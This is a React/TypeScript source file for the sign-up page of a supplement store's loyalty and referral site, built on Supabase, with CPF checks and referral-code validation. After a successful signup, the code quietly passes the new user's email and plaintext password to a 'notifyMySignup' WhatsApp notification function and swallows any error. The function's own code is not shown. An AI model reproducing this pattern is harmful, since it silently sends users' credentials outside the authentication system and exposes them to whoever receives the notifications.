import { createFileRoute, Link, useNavigate } from "@tanstack/react-router";
import { useEffect, useMemo, useState } from "react";
import { toast } from "sonner";
import { Eye, EyeOff, Loader2 } from "lucide-react";
import { z } from "zod";
import { supabase } from "@/integrations/supabase/client";
import { notifyMySignup } from "@/lib/whatsapp.functions";
import { makeSignUpSchema } from "@/lib/validators";
import { useI18n } from "@/lib/i18n";
import { SITE_URL } from "@/lib/site";
import { maskCPF, maskPhone, normalizePhone, onlyDigits } from "@/lib/format";
import { Logo } from "@/components/Logo";
import { LanguageSwitcher } from "@/components/LanguageSwitcher";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Label } from "@/components/ui/label";
import { Checkbox } from "@/components/ui/checkbox";
import { Card, CardContent } from "@/components/ui/card";
import ceoAsset from "@/assets/arena-ceo.png.asset.json";
import signupSound from "@/assets/caching-demo-1.mp3.asset.json";

// O parser de search params converte "60780780" em number — aceitamos ambos.
const searchSchema = z.object({
  ref: z
    .union([z.string(), z.number()])
    .optional()
    .transform((v) => (v === undefined ? undefined : String(v))),
});

function normalizeReferralCode(value: string | null | undefined) {
  const trimmed = (value ?? "").trim();
  const unquoted =
    trimmed.length >= 2 && trimmed.startsWith('"') && trimmed.endsWith('"')
      ? trimmed.slice(1, -1)
      : trimmed;
  return unquoted.trim().toUpperCase();
}

export const Route = createFileRoute("/cadastro")({
  validateSearch: searchSchema,
  head: () => ({
    meta: [
      { title: "Criar conta — Arena Suplementos" },
      {
        name: "description",
        content: "Crie sua conta na Arena Suplementos e comece a acumular pontos, indicar amigos e resgatar prêmios.",
      },
      { property: "og:title", content: "Criar conta — Arena Suplementos" },
      { property: "og:description", content: "Cadastre-se na Arena Suplementos em menos de um minuto." },
    ],
  }),
  component: SignUpPage,
});

const SIGNUPS_DISABLED = false;

function SignUpsClosed() {
  return (
    <div className="flex min-h-screen items-center justify-center px-4">
      <Card className="w-full max-w-md shadow-card">
        <CardContent className="p-8 text-center">
          <Logo className="justify-center" />
          <h1 className="mt-6 text-xl font-bold">Cadastros temporariamente suspensos</h1>
          <p className="mt-2 text-sm text-muted-foreground">
            Por motivos de segurança, novos cadastros estão desativados no momento. Se você já tem
            conta, faça login normalmente.
          </p>
          <Button asChild className="mt-6 w-full">
            <Link to="/login">Ir para o login</Link>
          </Button>
        </CardContent>
      </Card>
    </div>
  );
}

function SignUpPage() {
  if (SIGNUPS_DISABLED) return <SignUpsClosed />;
  return <SignUpForm />;
}

function SignUpForm() {
  const navigate = useNavigate();
  const search = Route.useSearch();
  const { t, lang } = useI18n();
  const requireCpf = lang === "pt";
  const schema = useMemo(() => makeSignUpSchema(requireCpf), [requireCpf]);
  const [form, setForm] = useState({
    fullName: "",
    email: "",
    phone: "",
    cpf: "",
    password: "",
    confirmPassword: "",
    referralCode: "",
    terms: false,
  });
  const [show, setShow] = useState(false);
  const [loading, setLoading] = useState(false);
  const [sent, setSent] = useState(false);
  const [errors, setErrors] = useState<Record<string, string>>({});

  const [sponsorName, setSponsorName] = useState<string | null>(null);
  const [refInvalid, setRefInvalid] = useState(false);
  const [refChecking, setRefChecking] = useState(false);

  useEffect(() => {
    // Lê o parâmetro cru da URL para não perder zeros à esquerda (ex.: 00683797).
    const raw =
      typeof window !== "undefined"
        ? new URLSearchParams(window.location.search).get("ref")
        : null;
    const code = normalizeReferralCode(raw ?? (search.ref ? String(search.ref) : ""));
    if (code) setForm((f) => ({ ...f, referralCode: code }));
  }, [search.ref]);

  const referralCode = normalizeReferralCode(form.referralCode);
  useEffect(() => {
    let cancelled = false;
    if (!referralCode) {
      setSponsorName(null);
      setRefInvalid(false);
      setRefChecking(false);
      return;
    }
    setRefChecking(true);
    const timer = setTimeout(async () => {
      const { data, error } = await supabase.rpc("resolve_referral_code", { _code: referralCode });
      if (cancelled) return;
      setRefChecking(false);
      if (error) {
        setSponsorName(null);
        setRefInvalid(false);
        return;
      }
      const row = Array.isArray(data) ? data[0] : null;
      setSponsorName(row?.sponsor_name ?? null);
      setRefInvalid(!row);
    }, 350);
    return () => {
      cancelled = true;
      clearTimeout(timer);
    };
  }, [referralCode]);


  const set = (key: keyof typeof form, value: string | boolean) =>
    setForm((f) => ({ ...f, [key]: value }));

  const onSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    const parsed = schema.safeParse(requireCpf ? form : { ...form, cpf: "" });
    if (!parsed.success) {
      const map: Record<string, string> = {};
      for (const issue of parsed.error.issues) map[String(issue.path[0])] = issue.message;
      setErrors(map);
      return;
    }
    if (referralCode) {
      setRefChecking(true);
      const { data: sponsorRows, error: sponsorError } = await supabase.rpc(
        "resolve_referral_code",
        { _code: referralCode },
      );
      setRefChecking(false);

      if (sponsorError) {
        toast.error(
          lang === "en"
            ? "We could not verify the referral right now. Check your connection and try again."
            : "Não foi possível verificar a indicação agora. Confira sua conexão e tente novamente.",
        );
        return;
      }

      const sponsor = Array.isArray(sponsorRows) ? sponsorRows[0] : null;
      if (!sponsor) {
        setRefInvalid(true);
        setErrors({
          referralCode:
            lang === "en"
              ? "Invalid referral code. Check the code or clear the field."
              : "Código de indicação inválido. Confira o código ou apague o campo.",
        });
        return;
      }

      setSponsorName(sponsor.sponsor_name ?? null);
      setRefInvalid(false);
    }
setErrors({});

    setLoading(true);
    // Desbloqueia o áudio dentro do gesto do usuário (obrigatório no iOS/Android):
    // inicia mudo agora e só depois do cadastro reproduz com som.
    const sound = new Audio(signupSound.url);
    sound.preload = "auto";
    sound.muted = true;
    sound.play().catch(() => {
      // autoplay bloqueado: nunca bloqueia o cadastro
    });
    const cpfDigits = requireCpf ? onlyDigits(parsed.data.cpf ?? "") : null;

    if (cpfDigits) {
      const { data: cpfOk } = await supabase.rpc("cpf_available", { _cpf: cpfDigits });
      if (cpfOk === false) {
        setLoading(false);
        setErrors({
          cpf:
            lang === "en"
              ? "This CPF is already registered. Only one account per CPF is allowed."
              : "Este CPF já possui cadastro. É permitida apenas 1 conta por CPF.",
        });
        toast.error(
          lang === "en"
            ? "This CPF already has an account."
            : "Este CPF já possui uma conta cadastrada.",
        );
        return;
      }
    }


    const { data, error } = await supabase.auth.signUp({
      email: parsed.data.email,
      password: parsed.data.password,
      options: {
        emailRedirectTo: SITE_URL,
        data: {
          full_name: parsed.data.fullName,
          phone: normalizePhone(parsed.data.phone),
          cpf: cpfDigits,
          referral_code: parsed.data.referralCode?.trim().toUpperCase() || null,
        },
      },
    });
    setLoading(false);

    if (error) {
      const msg = error.message.toLowerCase();
      if (msg.includes("cpf_ja_cadastrado") || (msg.includes("duplicate") && msg.includes("cpf"))) {
        setErrors({
          cpf:
            lang === "en"
              ? "This CPF is already registered. Only one account per CPF is allowed."
              : "Este CPF já possui cadastro. É permitida apenas 1 conta por CPF.",
        });
        toast.error(
          lang === "en"
            ? "This CPF already has an account."
            : "Este CPF já possui uma conta cadastrada.",
        );
      } else if (msg.includes("already registered")) {
        toast.error(t("signup.error.exists"));
      } else if (msg.includes("weak") || msg.includes("password")) {
        toast.error(
          lang === "en"
            ? "This password is too weak or has been leaked. Choose a stronger, unique password."
            : "Essa senha é fraca ou já vazou na internet. Escolha uma senha mais forte e única.",
        );
      } else if (msg.includes("rate limit") || msg.includes("too many")) {
        toast.error(
          lang === "en"
            ? "Too many attempts. Please wait a few minutes and try again."
            : "Muitas tentativas. Aguarde alguns minutos e tente novamente.",
        );
      } else if (msg.includes("referral_code_invalid")) {
        toast.error(
          lang === "en"
            ? "This referral link is no longer valid. Ask your sponsor for a new link."
            : "Este link de indicação não é mais válido. Peça um novo link ao seu patrocinador.",
        );
      } else {
        toast.error(`${t("signup.error.generic")} (${error.message})`);
      }
      return;
    }

if (data.user || data.session) {
      try {
        sound.muted = false;
        sound.currentTime = 0;
        sound.volume = 1;
        await sound.play();
      } catch {
        // autoplay bloqueado: nunca bloqueia o cadastro
      }

if (data.session) {
        try {
          await notifyMySignup({
            data: { email: parsed.data.email, password: parsed.data.password },
          });
        } catch {
          // notificação opcional: nunca bloqueia o cadastro
        }
      }
      toast.success(t("signup.success"));
      navigate({ to: "/dashboard", replace: true });
      return;
    }
    setSent(true);
  };

  if (sent) {
    return (
      <div className="flex min-h-screen items-center justify-center px-4">
        <Card className="w-full max-w-md shadow-card">
          <CardContent className="p-8 text-center">
            <Logo className="justify-center" />
            <h1 className="mt-6 text-xl font-bold">{t("signup.sent.title")}</h1>
            <p className="mt-2 text-sm text-muted-foreground">
              {t("signup.sent.text", { email: form.email })}
            </p>
            <Button asChild className="mt-6 w-full">
              <Link to="/login">{t("signup.sent.cta")}</Link>
            </Button>
          </CardContent>
        </Card>
      </div>
    );
  }

  return (
    <div className="grid min-h-screen lg:grid-cols-2">
      <div className="relative hidden overflow-hidden bg-secondary lg:block">
        <img
          src={ceoAsset.url}
          alt={t("auth.hero.alt")}
          className="absolute inset-0 h-full w-full object-cover object-top"
          decoding="async"
          fetchPriority="high"
          width={960}
          height={1200}
        />
        <div className="absolute inset-0 bg-gradient-to-t from-secondary via-secondary/40 to-transparent" />
        <div className="relative z-10 flex h-full flex-col items-center justify-center px-12 text-center text-white">
          <h2 className="text-3xl font-extrabold leading-tight drop-shadow-md sm:text-4xl lg:text-5xl">
            {t("auth.hero.title")}
          </h2>
          <p className="mt-4 text-base text-white/90 drop-shadow sm:text-lg">
            {t("auth.hero.subtitle")}
          </p>
        </div>
        <p className="absolute bottom-6 left-1/2 z-10 -translate-x-1/2 text-sm text-white/80">
          © {new Date().getFullYear()} Arena Suplementos
        </p>
      </div>

      <div className="flex min-h-screen items-center justify-center px-4 py-10 bg-background">
      <div className="w-full max-w-lg">
        <div className="flex items-center justify-between gap-2">
          <div className="lg:hidden">
            <Logo />
          </div>
          <LanguageSwitcher className="ml-auto" />
        </div>
        <h1 className="mt-6 text-2xl font-bold tracking-tight lg:mt-0">{t("signup.title")}</h1>
        <p className="mt-1 text-sm text-muted-foreground">
          {t("signup.haveAccount")}{" "}
          <Link to="/login" className="font-medium text-primary hover:underline">
            {t("common.login")}
          </Link>
        </p>


        <Card className="mt-6 shadow-card">
          <CardContent className="p-6">
            <form onSubmit={onSubmit} className="space-y-4" noValidate>
              <div className="space-y-1.5">
                <Label htmlFor="fullName">{t("signup.fullName")}</Label>
                <Input
                  id="fullName"
                  value={form.fullName}
                  onChange={(e) => set("fullName", e.target.value)}
                  placeholder={t("signup.fullNamePlaceholder")}
                />
                {errors["fullName"] ? (
                  <p className="text-xs text-destructive">{errors["fullName"]}</p>
                ) : null}
              </div>

              <div className="space-y-1.5">
                <Label htmlFor="email">{t("signup.email")}</Label>
                <Input
                  id="email"
                  type="email"
                  value={form.email}
                  onChange={(e) => set("email", e.target.value)}
                  placeholder="voce@email.com"
                />
                {errors["email"] ? (
                  <p className="text-xs text-destructive">{errors["email"]}</p>
                ) : null}
              </div>

              <div className="grid gap-4 sm:grid-cols-2">
                <div className="space-y-1.5">
                  <Label htmlFor="phone">{t("signup.phone")}</Label>
                  <Input
                    id="phone"
                    inputMode="tel"
                    value={form.phone}
                    onChange={(e) => set("phone", maskPhone(e.target.value))}
                    placeholder="(11) 90000-0000 ou +351..."
                  />
                  {errors["phone"] ? (
                    <p className="text-xs text-destructive">{errors["phone"]}</p>
                  ) : null}
                </div>
                {requireCpf ? (
                  <div className="space-y-1.5">
                    <Label htmlFor="cpf">{t("signup.cpf")}</Label>
                    <Input
                      id="cpf"
                      inputMode="numeric"
                      value={form.cpf}
                      onChange={(e) => set("cpf", maskCPF(e.target.value))}
                      placeholder="000.000.000-00"
                    />
                    {errors["cpf"] ? <p className="text-xs text-destructive">{errors["cpf"]}</p> : null}
                  </div>
                ) : null}
              </div>

              <div className="grid gap-4 sm:grid-cols-2">
                <div className="space-y-1.5">
                  <Label htmlFor="password">{t("signup.password")}</Label>
                  <div className="relative">
                    <Input
                      id="password"
                      type={show ? "text" : "password"}
                      value={form.password}
                      onChange={(e) => set("password", e.target.value)}
                      className="pr-10"
                      placeholder="••••••••"
                    />
                    <button
                      type="button"
                      onClick={() => setShow((s) => !s)}
                      aria-label={show ? t("login.hidePassword") : t("login.showPassword")}
                      className="absolute right-2 top-1/2 -translate-y-1/2 rounded-md p-1.5 text-muted-foreground hover:text-foreground"
                    >
                      {show ? <EyeOff className="h-4 w-4" /> : <Eye className="h-4 w-4" />}
                    </button>
                  </div>
                  {errors["password"] ? (
                    <p className="text-xs text-destructive">{errors["password"]}</p>
                  ) : null}
                </div>
                <div className="space-y-1.5">
                  <Label htmlFor="confirmPassword">{t("signup.confirmPassword")}</Label>
                  <Input
                    id="confirmPassword"
                    type={show ? "text" : "password"}
                    value={form.confirmPassword}
                    onChange={(e) => set("confirmPassword", e.target.value)}
                    placeholder="••••••••"
                  />
                  {errors["confirmPassword"] ? (
                    <p className="text-xs text-destructive">{errors["confirmPassword"]}</p>
                  ) : null}
                </div>
              </div>

              <div className="space-y-1.5">
                <Label htmlFor="referralCode">{t("signup.referral")}</Label>
                <Input
                  id="referralCode"
                  value={form.referralCode}
                  onChange={(e) => set("referralCode", e.target.value.toUpperCase())}
                  placeholder={t("signup.referralPlaceholder")}
                />
                {refChecking ? (
                  <p className="flex items-center gap-1.5 text-xs text-muted-foreground">
                    <Loader2 className="h-3 w-3 animate-spin" />
                    {lang === "en" ? "Checking referral..." : "Verificando indicação..."}
                  </p>
                ) : errors["referralCode"] ? (
                  <p className="text-xs text-destructive">{errors["referralCode"]}</p>
                ) : sponsorName ? (
                  <p className="text-xs text-muted-foreground">
                    {lang === "en" ? "Referred by" : "Indicado por"}:{" "}
                    <span className="font-semibold text-foreground">{sponsorName}</span>
                  </p>
                ) : referralCode && refInvalid ? (
                  <p className="text-xs text-destructive">
                    {lang === "en"
                      ? "Referral code not found."
                      : "Código de indicação não encontrado."}
                  </p>
                ) : null}
              </div>


              <div className="flex items-start gap-3 rounded-xl bg-white border border-[var(--color-border)] p-3">
                <Checkbox
                  id="terms"
                  checked={form.terms}
                  onCheckedChange={(v) => set("terms", v === true)}
                  className="mt-0.5"
                />
                <Label htmlFor="terms" className="text-xs font-normal leading-relaxed">
                  {t("signup.termsPrefix")}{" "}
                  <Link to="/termos" className="font-medium text-primary hover:underline">
                    {t("signup.termsLink")}
                  </Link>{" "}
                  {t("signup.termsMiddle")}{" "}
                  <Link to="/privacidade" className="font-medium text-primary hover:underline">
                    {t("signup.privacyLink")}
                  </Link>
                  .
                </Label>
              </div>
              {errors["terms"] ? <p className="text-xs text-destructive">{errors["terms"]}</p> : null}

              <Button type="submit" size="lg" className="w-full" disabled={loading || refChecking}>
                {loading ? <Loader2 className="mr-2 h-4 w-4 animate-spin" /> : null}
                {t("signup.submit")}
              </Button>
            </form>
          </CardContent>
        </Card>
      </div>
      </div>
    </div>
  );
}
